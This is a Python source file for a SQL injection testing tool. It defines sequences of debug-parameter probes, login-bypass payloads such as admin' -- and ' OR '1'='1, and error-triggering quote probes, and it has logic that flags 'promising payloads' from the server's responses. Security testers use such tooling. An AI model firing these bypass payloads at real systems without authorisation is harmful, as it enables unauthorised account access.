from typing import List, Dict, Optional
from dataclasses import dataclass
from state_tracking import ResponseAnalysis

@dataclass
class TestStep:
    field: str
    value: str
    description: str
    expected_indicators: List[str]

class SQLiTestSequence:
    def __init__(self):
        self.debug_sequence = [
            TestStep("debug", "1", "Enable debug output", ["SELECT", "FROM", "WHERE"]),
            TestStep("debug", "true", "Enable debug output", ["SELECT", "FROM", "WHERE"]),
            TestStep("debug", "yes", "Enable debug output", ["SELECT", "FROM", "WHERE"]),
            TestStep("test", "1", "Enable test mode", ["SELECT", "FROM", "WHERE"]),
            TestStep("dev", "1", "Enable dev mode", ["SELECT", "FROM", "WHERE"])
        ]
        
        self.auth_bypass_sequence = [
            TestStep("username", "admin' --", "Basic comment bypass", ["Welcome", "admin", "success"]),
            TestStep("username", "admin\" --", "Double quote comment bypass", ["Welcome", "admin", "success"]),
            TestStep("username", "admin'/*", "C-style comment bypass", ["Welcome", "admin", "success"]),
            TestStep("username", "' OR '1'='1", "OR injection", ["Welcome", "admin", "success"]),
            TestStep("username", "\" OR \"1\"=\"1", "Double quote OR injection", ["Welcome", "admin", "success"])
        ]
        
        self.error_based_sequence = [
            TestStep("username", "'", "Single quote error", ["error", "syntax", "mysql", "sql"]),
            TestStep("username", "\"", "Double quote error", ["error", "syntax", "mysql", "sql"]),
            TestStep("username", "\\", "Backslash error", ["error", "syntax", "mysql", "sql"]),
            TestStep("username", "')", "Bracket error", ["error", "syntax", "mysql", "sql"])
        ]

class TestManager:
    def __init__(self):
        self.sequences = SQLiTestSequence()
        self.current_sequence: List[TestStep] = []
        self.current_step_index: int = 0
        self.results: Dict[str, ResponseAnalysis] = {}
        
    def start_debug_sequence(self) -> TestStep:
        """Start testing debug parameters"""
        self.current_sequence = self.sequences.debug_sequence
        self.current_step_index = 0
        return self.current_sequence[0]
        
    def start_auth_bypass(self) -> TestStep:
        """Start testing auth bypass payloads"""
        self.current_sequence = self.sequences.auth_bypass_sequence
        self.current_step_index = 0
        return self.current_sequence[0]
        
    def start_error_based(self) -> TestStep:
        """Start testing error-based payloads"""
        self.current_sequence = self.sequences.error_based_sequence
        self.current_step_index = 0
        return self.current_sequence[0]
        
    def next_step(self) -> Optional[TestStep]:
        """Get next test in current sequence"""
        self.current_step_index += 1
        if self.current_step_index >= len(self.current_sequence):
            return None
        return self.current_sequence[self.current_step_index]
        
    def record_result(self, step: TestStep, response: ResponseAnalysis) -> bool:
        """Record and analyze a test result"""
        self.results[f"{step.field}:{step.value}"] = response
        
        # Check if any expected indicators were found
        return any(
            indicator.lower() in str(response.sql_snippet).lower() or
            indicator.lower() in str(response.error_messages).lower()
            for indicator in step.expected_indicators
        )

    def get_promising_payloads(self) -> List[TestStep]:
        """Get payloads that showed promising results"""
        return [
            step for step in self.current_sequence
            if self.results.get(f"{step.field}:{step.value}") and
            any(indicator.lower() in str(self.results[f"{step.field}:{step.value}"].sql_snippet).lower()
                for indicator in step.expected_indicators)
        ] 